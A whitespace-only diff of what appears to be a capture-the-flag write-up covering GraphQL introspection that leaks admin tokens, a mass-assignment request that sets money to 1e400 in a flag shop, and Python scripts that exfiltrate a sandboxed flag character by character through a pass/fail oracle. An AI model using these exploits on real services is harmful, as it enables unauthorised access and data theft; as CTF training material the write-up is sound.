@@ -58,19 +58,19 @@ document.getElementById('form').onsubmit = async e => {
   const email = document.getElementById('email').value;
 
   let res = await (await fetch('/graphql', {
-	method: 'POST',
-	headers: {
-	  'Content-Type': 'application/json'
-	},
-	body: JSON.stringify({
-	  query,
-	  variables: { email }
-	})
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    query,
+    variables: { email }
+  })
   })).json();
 
   if (res.data) {
-	document.getElementById('form-wrapper').innerHTML = `<h2 class="form-heading 
-			text-center">Thanks, you'll hear from us soon!</h2>`
+  document.getElementById('form-wrapper').innerHTML = `<h2 class="form-heading 
+      text-center">Thanks, you'll hear from us soon!</h2>`
   }
 
   return false;
@@ -111,8 +111,8 @@ Current query send every time is this one:
 
 ```json
 {
-	"query" : "mutation createUser($email: String!){\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n",
-	"variables" : {"email" : "test@test.com"}
+  "query" : "mutation createUser($email: String!){\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n",
+  "variables" : {"email" : "test@test.com"}
 }
 ```
 
@@ -122,8 +122,8 @@ To enumarate the objects in the API we can use the following query. [HackTricks 
 
 ```json
 {
-	"query":"{__schema{\n\t queryType{\n\t fields{\n\t name\n}\n}\n}\n}",
-	"variables":{"email":"test@test.com"}
+  "query":"{__schema{\n\t queryType{\n\t fields{\n\t name\n}\n}\n}\n}",
+  "variables":{"email":"test@test.com"}
 }
 ```
 
@@ -138,8 +138,8 @@ To get more information:
 
 ```json
 {
-	"query":"{__schema {types {name}}}",
-	"variables":{"email":"test@test.com"}
+  "query":"{__schema {types {name}}}",
+  "variables":{"email":"test@test.com"}
 }
 ```
 
@@ -155,8 +155,8 @@ Let's retrieve the users by the username (since we saw that the response to crea
 
 ```json
 {
-	"query":"{users {username}}",
-	"variables":{"email":"test@test.com"}
+  "query":"{users {username}}",
+  "variables":{"email":"test@test.com"}
 }
 ```
 
@@ -179,7 +179,7 @@ Response Error:
 
 ```json
 {
-	"message":"Field \"flag\" argument \"token\" of type \"String!\" is required, but it was not provided."
+  "message":"Field \"flag\" argument \"token\" of type \"String!\" is required, but it was not provided."
 }
 ```
 
@@ -196,15 +196,15 @@ Response:
 ```json
 {"data":{
   "users":[
-	{
-	  "username":"admin",
-	  "token":"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b"
-	},
-	{
-	  "username":"b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c",
-	  "token":"5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6"
-	},
-	{"...":"..."}
+  {
+    "username":"admin",
+    "token":"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b"
+  },
+  {
+    "username":"b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c",
+    "token":"5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6"
+  },
+  {"...":"..."}
 ```
 
 Now let's try to retrieve the flag using the admin token:
@@ -279,26 +279,26 @@ const fs = require("fs");
 
 const flags = new Map();
 for(let flag of JSON.parse(fs.readFileSync("flags.json")).flags) {
-	if(flag.name === "corCTF") {
-		flag.text = process.env.FLAG || "corctf{test_flag}";
-	}
-	flags.set(flag.name, flag);
+  if(flag.name === "corCTF") {
+    flag.text = process.env.FLAG || "corctf{test_flag}";
+  }
+  flags.set(flag.name, flag);
 }
 
 const users = new Map();
 
 const buyFlag = ({ flag, user }) => {
 
-	if(!flags.has(flag)) {
-		throw new Error("Unknown flag");
-	}
-	if(user.money < flags.get(flag).price) {
-		throw new Error("Not enough money");
-	}
+  if(!flags.has(flag)) {
+    throw new Error("Unknown flag");
+  }
+  if(user.money < flags.get(flag).price) {
+    throw new Error("Not enough money");
+  }
 
-	user.money -= flags.get(flag).price;
-	user.flags.push(flag);
-	users.set(user.user, user);
+  user.money -= flags.get(flag).price;
+  user.flags.push(flag);
+  users.set(user.user, user);
 };
 
 module.exports = { flags, users, buyFlag };
@@ -315,59 +315,59 @@ const router = express.Router();
 const db = require("../db.js");
 
 const requiresLogin = (req, res, next) => {
-	if(!req.user) {
-		return res.redirect("/?error=" + encodeURIComponent("You must be logged in"));
-	}
-	next();
+  if(!req.user) {
+    return res.redirect("/?error=" + encodeURIComponent("You must be logged in"));
+  }
+  next();
 };
 
 router.post("/register", async (req, res) => {
-	let { user, pass } = req.body;
-	if(!user || !pass) {
-		return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
-	}
-	if(db.users.has(user)) {
-		return res.redirect("/?error=" + encodeURIComponent("A user already exists with that username"));
-	}
-	db.users.set(user, {
-		user,
-		flags: [],
-		money: 100,
-		pass: await bcrypt.hash(pass, 12)
-	});
-	res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
-	res.redirect("/");
+  let { user, pass } = req.body;
+  if(!user || !pass) {
+    return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
+  }
+  if(db.users.has(user)) {
+    return res.redirect("/?error=" + encodeURIComponent("A user already exists with that username"));
+  }
+  db.users.set(user, {
+    user,
+    flags: [],
+    money: 100,
+    pass: await bcrypt.hash(pass, 12)
+  });
+  res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
+  res.redirect("/");
 });
 
 router.post("/login", async (req, res) => {
-	let { user, pass } = req.body;
-	if(!user || !pass) {
-		return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
-	}
-	if(!db.users.has(user)) {
-		return res.redirect("/?error=" + encodeURIComponent("No user exists with that username"));
-	}
-	if(!await bcrypt.compare(pass, db.users.get(user).pass)) {
-		return res.redirect("/?error=" + encodeURIComponent("Incorrect password"));
-	}
+  let { user, pass } = req.body;
+  if(!user || !pass) {
+    return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
+  }
+  if(!db.users.has(user)) {
+    return res.redirect("/?error=" + encodeURIComponent("No user exists with that username"));
+  }
+  if(!await bcrypt.compare(pass, db.users.get(user).pass)) {
+    return res.redirect("/?error=" + encodeURIComponent("Incorrect password"));
+  }
 
-	res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
-	res.redirect("/");
+  res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
+  res.redirect("/");
 });
 
 //Special attention here:
 router.post("/buy", requiresLogin, async (req, res) => {
-	if(!req.body.flag) {
-		return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
-	}
-	try {
-		db.buyFlag({ user: req.user, ...req.body });
-	}
-	catch(err) {
-		return res.redirect("/flags?error=" + encodeURIComponent(err.message));
-	}
+  if(!req.body.flag) {
+    return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
+  }
+  try {
+    db.buyFlag({ user: req.user, ...req.body });
+  }
+  catch(err) {
+    return res.redirect("/flags?error=" + encodeURIComponent(err.message));
+  }
 
-	res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
+  res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
 });
 
 module.exports = router;
@@ -388,18 +388,18 @@ Then I just focused on the buying process. And found this piece of code interest
 
 ```javascript
 router.post("/buy", requiresLogin, async (req, res) => {
-	if(!req.body.flag) {
-		return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
-	}
-	try {
-		//Buying a flag with spread argument controlled by a user
-		db.buyFlag({ user: req.user, ...req.body });
-	}
-	catch(err) {
-		return res.redirect("/flags?error=" + encodeURIComponent(err.message));
-	}
+  if(!req.body.flag) {
+    return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
+  }
+  try {
+    //Buying a flag with spread argument controlled by a user
+    db.buyFlag({ user: req.user, ...req.body });
+  }
+  catch(err) {
+    return res.redirect("/flags?error=" + encodeURIComponent(err.message));
+  }
 
-	res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
+  res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
 });
 ```
 
@@ -414,16 +414,16 @@ We can see that a POST request is sent with variable user equals to the user obt
 ```javascript
 const buyFlag = ({ flag, user }) => {
 
-	if(!flags.has(flag)) {
-		throw new Error("Unknown flag");
-	}
-	if(user.money < flags.get(flag).price) {
-		throw new Error("Not enough money");
-	}
+  if(!flags.has(flag)) {
+    throw new Error("Unknown flag");
+  }
+  if(user.money < flags.get(flag).price) {
+    throw new Error("Not enough money");
+  }
 
-	user.money -= flags.get(flag).price;
-	user.flags.push(flag);
-	users.set(user.user, user);
+  user.money -= flags.get(flag).price;
+  user.flags.push(flag);
+  users.set(user.user, user);
 };
 ```
 
@@ -458,12 +458,12 @@ Content-Type: application/json
 Cookie: user=s%3Akash.hWxlfYBnVsfOT6FEyD7nAloOEFSk7kX4%2BHCCYdnKBVk
 
 {"flag":"corCTF",
-	"user":{
-		"user": "kash",
-		"flags": [],
-		"money": 1e400,
-		"pass":"$2b$12$e4fanJaZOX1pwZTVxsHcZOIuGp.3Ti27FtVnesFrURw4eSWfY6aGi"
-	}
+  "user":{
+    "user": "kash",
+    "flags": [],
+    "money": 1e400,
+    "pass":"$2b$12$e4fanJaZOX1pwZTVxsHcZOIuGp.3Ti27FtVnesFrURw4eSWfY6aGi"
+  }
 }
 ```
 
@@ -520,9 +520,9 @@ import random, epicbox, os
 # docker pull 
 
 epicbox.configure(
-	profiles=[
-		epicbox.Profile('python', 'python:3.9.6-alpine')
-	]
+  profiles=[
+    epicbox.Profile('python', 'python:3.9.6-alpine')
+  ]
 )
 
 app = Flask(__name__)
@@ -531,52 +531,52 @@ flag = open('flag.txt').read()
 
 @app.route('/')
 def yeet():
-	return render_template('yeet.html')
+  return render_template('yeet.html')
 
 @app.route('/yeet')
 def yeetyeet():
-	return render_template('yeetyeet.html')
+  return render_template('yeetyeet.html')
 
 @app.route('/yeetyeet', methods=['POST'])
 def yeetyeetyeet():
-	if 'run' in session and session['run']:
-		return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
-	session['run'] = True
-	code = request.data
-	tests = [(2, 3, 5), (5, 7, 12)]
-	for _ in range(8):
-		a, b = random.randint(1, 100), random.randint(1, 100)
-		tests.append((a, b, a + b))
-	
-	cmd = 'from code import f\n'
-	outputs = []
-	for case in tests:
-		a, b, ans = case
-		cmd += f'print(f({a}, {b}))\n'
-		outputs.append(str(ans))
+  if 'run' in session and session['run']:
+    return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
+  session['run'] = True
+  code = request.data
+  tests = [(2, 3, 5), (5, 7, 12)]
+  for _ in range(8):
+    a, b = random.randint(1, 100), random.randint(1, 100)
+    tests.append((a, b, a + b))
+  
+  cmd = 'from code import f\n'
+  outputs = []
+  for case in tests:
+    a, b, ans = case
+    cmd += f'print(f({a}, {b}))\n'
+    outputs.append(str(ans))
 
-	files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
-	limits = {'cputime': 1, 'memory': 16}
-	result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)
+  files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
+  limits = {'cputime': 1, 'memory': 16}
+  result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)
 
-	if result['exit_code'] != 0:
-		session['run'] = False
-		return {'error': True, 'msg': 'Oops! Your code has an error in it. Please try again.'}
-	actual = result['stdout'].decode().strip().split('\n')
+  if result['exit_code'] != 0:
+    session['run'] = False
+    return {'error': True, 'msg': 'Oops! Your code has an error in it. Please try again.'}
+  actual = result['stdout'].decode().strip().split('\n')
 
-	passes = 0
-	fails = 0
-	for i in range(len(outputs)):
-		if outputs[i] == actual[i]:
-			passes += 1
-		else:
-			fails += 1
+  passes = 0
+  fails = 0
+  for i in range(len(outputs)):
+    if outputs[i] == actual[i]:
+      passes += 1
+    else:
+      fails += 1
 
-	session['run'] = False
-	return {'error': False, 'p': passes, 'f': fails}
+  session['run'] = False
+  return {'error': False, 'p': passes, 'f': fails}
 
 if __name__ == "__main__":
-	app.run(host='0.0.0.0', port=5000)
+  app.run(host='0.0.0.0', port=5000)
 ```
 
 We cannot just place a print in the code and print the flag, because there is no output, but we can access and read the flag to make operations over it.
@@ -595,33 +595,33 @@ import requests
 
 def guess_it(flag_index):
 
-	a, b = 97, 126
+  a, b = 97, 126
 
-	for guess in range(a,b):
+  for guess in range(a,b):
 
-		print("Guess ascii: {} - {}".format(guess, chr(guess)))
+    print("Guess ascii: {} - {}".format(guess, chr(guess)))
 
-		r = requests.post(url=url, data = input_code.format(flag_index, guess), cookies = cookie)
-		#print(r.json())
-		# If read char if right:
-		if r.json()['p'] == 1:
+    r = requests.post(url=url, data = input_code.format(flag_index, guess), cookies = cookie)
+    #print(r.json())
+    # If read char if right:
+    if r.json()['p'] == 1:
 
-			print('Found: ' + chr(guess))
-			return chr(guess)
+      print('Found: ' + chr(guess))
+      return chr(guess)
 
-	return 0
+  return 0
 
 
 input_code = """def f(a, b):
-	if a==2 and b==3:
-		f = open("flag.txt", "rb")
-		char = f.read()[{}]
-		if char == {}:
-			return 5
-		else:
-			return 1234
-	else:
-		return a"""
+  if a==2 and b==3:
+    f = open("flag.txt", "rb")
+    char = f.read()[{}]
+    if char == {}:
+      return 5
+    else:
+      return 1234
+  else:
+    return a"""
 
 
 url = "https://yeetcode.be.ax/yeetyeet"
@@ -630,8 +630,8 @@ cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}
 flag = []
 
 for flag_index in range(0,50):
-	flag.append(guess_it(flag_index))
-	print(''.join(flag))
+  flag.append(guess_it(flag_index))
+  print(''.join(flag))
 ```
 
 It will take so long to get it by using linear search O(n)... Let's go for an easy binary search strategy (and also, use all posible ascii characters (from 32 to 126)):
@@ -641,36 +641,36 @@ import requests
 
 def guess_it(flag_index):
 
-	a, b = 32, 126
-	mid = (a+b)//2
+  a, b = 32, 126
+  mid = (a+b)//2
 
-	while a < b:
+  while a < b:
 
-		print("Guess ascii: {} - {}".format(mid, chr(mid)))
+    print("Guess ascii: {} - {}".format(mid, chr(mid)))
 
-		r = requests.post(url=url, data = input_code.format(flag_index, mid), cookies = cookie)
-		#print(r.json())
-		# If read char if right:
-		if r.json()['p'] == 1:
-			b = mid
-		else:
-			a = mid + 1
-		mid = (a+b)//2
+    r = requests.post(url=url, data = input_code.format(flag_index, mid), cookies = cookie)
+    #print(r.json())
+    # If read char if right:
+    if r.json()['p'] == 1:
+      b = mid
+    else:
+      a = mid + 1
+    mid = (a+b)//2
 
-	
-	return chr(mid-1)
+  
+  return chr(mid-1)
 
 
 input_code = """def f(a, b):
-	if a==2 and b==3:
-		f = open("flag.txt", "rb")
-		char = f.read()[{}]
-		if char < {}:
-			return 5
-		else:
-			return 1234
-	else:
-		return a"""
+  if a==2 and b==3:
+    f = open("flag.txt", "rb")
+    char = f.read()[{}]
+    if char < {}:
+      return 5
+    else:
+      return 1234
+  else:
+    return a"""
 
 url = "https://yeetcode.be.ax/yeetyeet"
 cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}
@@ -678,8 +678,8 @@ cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}
 flag = []
 
 for flag_index in range(0,50):
-	flag.append(guess_it(flag_index))
-	print(''.join(flag))
+  flag.append(guess_it(flag_index))
+  print(''.join(flag))
 
 ```
 
